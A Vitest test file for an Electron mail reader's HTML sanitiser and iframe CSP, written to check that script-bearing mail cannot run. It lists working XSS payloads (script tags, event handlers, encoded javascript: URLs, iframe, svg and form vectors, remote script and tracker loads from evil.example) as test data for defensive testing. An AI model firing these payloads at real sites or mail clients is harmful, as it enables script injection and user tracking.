import { describe, expect, it } from 'vitest';
import { sanitizeMailHtml } from '../electron/sanitize';
import { buildIframeSrcDoc } from '../src/html';

/**
 * QA-independent XSS sweep for the reading pane.
 *
 * Mail is untrusted input and the reading pane is the one place a hostile
 * sender can reach the user, so this file fires REAL attack payloads (not
 * toy strings) at the sanitiser and asserts the invariants the design promises:
 * no script can survive, remote images are blocked by default, and sanitising
 * never throws on malformed input.
 */

const EXECUTABLE = [
  // script tags, with case / nesting tricks
  '<script>alert(1)</script>',
  '<ScRiPt>alert(1)</ScRiPt>',
  '<ScRiPt src="//evil.example/x.js"></ScRiPt>',
  '<scr<script>ipt>alert(1)</script>',
  '<script type="text/javascript">fetch("//evil")</script>',
  // event handlers
  '<img src=x onerror=alert(1)>',
  '<div onmouseover="alert(1)">hover</div>',
  '<body onload=alert(1)>',
  // dangerous URL schemes
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6a;avascript:alert(1)">x</a>',
  '<img src="javascript:alert(1)">',
  // embedding vectors
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example"></object>',
  '<embed src="https://evil.example">',
  '<svg><script>alert(1)</script></svg>',
  '<svg/onload=alert(1)>',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<form action="https://evil.example"><input name="a"><button>go</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
];

describe('QA sanitizeMailHtml — 可执行载荷一律不得存活', () => {
  it.each(EXECUTABLE)('%s 被清除', (payload) => {
    const out = sanitizeMailHtml(payload);
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/<iframe/i);
    expect(out).not.toMatch(/<object/i);
    expect(out).not.toMatch(/<embed/i);
    expect(out).not.toMatch(/<svg/i);
    expect(out).not.toMatch(/\son\w+\s*=/i); // no inline event handler attributes
    expect(out).not.toMatch(/javascript:/i);
  });

  it('净化并非「一律清空」——正常邮件内容必须保留', () => {
    const out = sanitizeMailHtml(
      '<p>尊敬的用户，<b>您的验证码是 483920</b></p><table><tbody><tr><td>a</td></tr></tbody></table>',
    );
    expect(out).toContain('<p>');
    expect(out).toContain('<b>您的验证码是 483920</b>');
    expect(out).toContain('<table>');
  });

  it('净化任何载荷都不会抛异常', () => {
    expect(() => {
      for (const p of EXECUTABLE) sanitizeMailHtml(p);
      sanitizeMailHtml('\u0000\u0001<<<>>>&&&');
      sanitizeMailHtml('<div>' as string);
      sanitizeMailHtml(undefined as unknown as string);
    }).not.toThrow();
  });
});

describe('QA sanitizeMailHtml — 远程图片默认拦截', () => {
  it('http(s) 图片默认被移除（src 消失）', () => {
    const out = sanitizeMailHtml('<img src="https://evil.example/tracker.png">');
    expect(out).not.toContain('evil.example');
    expect(out).not.toMatch(/src\s*=/i);
  });

  it('协议相对 // 图片也被拦截', () => {
    const out = sanitizeMailHtml('<img src="//evil.example/tracker.png">');
    expect(out).not.toContain('evil.example');
  });

  it('内联 data: 图片被保留（不联网）', () => {
    expect(sanitizeMailHtml('<img src="data:image/png;base64,AAAA">')).toContain('data:image/png;base64,AAAA');
  });

  it('CSS 里的远程 url() 被中和', () => {
    const out = sanitizeMailHtml('<div style="background:url(https://evil.example/x.png)">x</div>');
    expect(out).not.toContain('evil.example');
  });

  it('用户显式允许后，远程图片恢复', () => {
    const out = sanitizeMailHtml('<img src="https://cdn.example/logo.png">', { allowRemoteImages: true });
    expect(out).toContain('https://cdn.example/logo.png');
  });
});

describe('QA buildIframeSrcDoc — 沙箱 CSP 第二道防线', () => {
  it('默认 CSP 禁止脚本与远程图片', () => {
    const doc = buildIframeSrcDoc('<p>hi</p>', { allowRemoteImages: false });
    expect(doc).toContain("script-src 'none'");
    expect(doc).toContain('object-src \'none\'');
    expect(doc).toMatch(/img-src data:;/);
    expect(doc).not.toMatch(/img-src[^;]*https/);
  });

  it('允许外部图片时仅放开 img-src', () => {
    const doc = buildIframeSrcDoc('<p>hi</p>', { allowRemoteImages: true });
    expect(doc).toMatch(/img-src[^;]*https/);
    expect(doc).toContain("script-src 'none'"); // scripts stay banned regardless
  });

  it('外链默认新窗口打开（base target=_blank）', () => {
    expect(buildIframeSrcDoc('x', { allowRemoteImages: false })).toContain('<base target="_blank">');
  });
});
